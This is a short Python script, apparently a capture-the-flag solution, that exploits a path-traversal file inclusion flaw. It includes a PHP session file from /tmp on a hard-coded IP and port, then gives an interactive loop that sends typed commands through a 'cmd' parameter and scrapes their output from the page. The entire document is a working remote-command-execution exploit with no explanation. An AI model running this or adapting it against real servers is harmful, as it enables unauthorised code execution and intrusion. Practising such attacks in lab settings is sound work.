import readline

import requests

if __name__ == "__main__":
    sess = input("PHPSESSID: ")
    URL = "http://138.68.178.56:30843/?f=../../../../tmp/sess_" + sess

    while True:
        cmd = input("cmd: ")
        res = requests.get(f"{URL}&cmd={cmd}")    
        text = res.text

        content = text.split('React.createElement("p", null, "')[1]
        content = content.split('"), /*#__PURE__*/')[0]

        print(content)
